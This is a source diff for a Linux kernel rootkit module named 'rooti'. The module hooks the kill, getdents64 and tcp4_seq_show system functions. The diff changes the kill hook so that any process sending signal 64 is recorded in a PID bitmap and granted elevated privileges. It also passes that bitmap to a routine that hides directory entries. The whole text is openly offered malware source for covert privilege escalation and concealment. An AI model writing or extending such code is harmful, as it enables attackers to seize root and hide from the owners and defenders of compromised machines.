@@ -5,6 +5,7 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
+#include <linux/threads.h>
 #include <net/sock.h>
 #include <net/tcp.h>
 #include "hooking/utils.h"
@@ -12,9 +13,9 @@
 #include "hooking/syscall.h"
 #include "hooking/func.h"
 #include "hooking/ops.h"
+#include "capabilities/privilege.h"
 #include "capabilities/track.h"
 #include "capabilities/hide.h"
-#include "client.h"
 #include "config.h"
 
 MODULE_LICENSE("GPL");
@@ -28,8 +29,8 @@ enum rooti_signals {
     ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
 };
 
-// Userspace process serviced by this rootkit
-static struct rooti_client rooti_client_proc;
+// Bitmap in which every bit represents the PID number of a registered client userspace process
+static unsigned char rooti_clients_bitmap[PID_MAX_LIMIT / 8] = {0};
 
 // List of /proc directory FDs opened by userspace processes
 static LIST_HEAD(rooti_proc_tracked_fds);
@@ -71,7 +72,8 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     }
     else if (sig == ROOTI_SIG_REG) {
         // Register the new process
-        return rooti_register_client(&rooti_client_proc);
+        rooti_clients_bitmap[current->pid / 8] |= (1U << current->pid % 8);
+        return rooti_elevate_privilege();
     }
     return orig_kill(regs);
 }
@@ -181,7 +183,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);
 
     // Filter any files we wish to hide from the buffer
-    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_client_proc.pid);
+    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_clients_bitmap);
 }
 
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
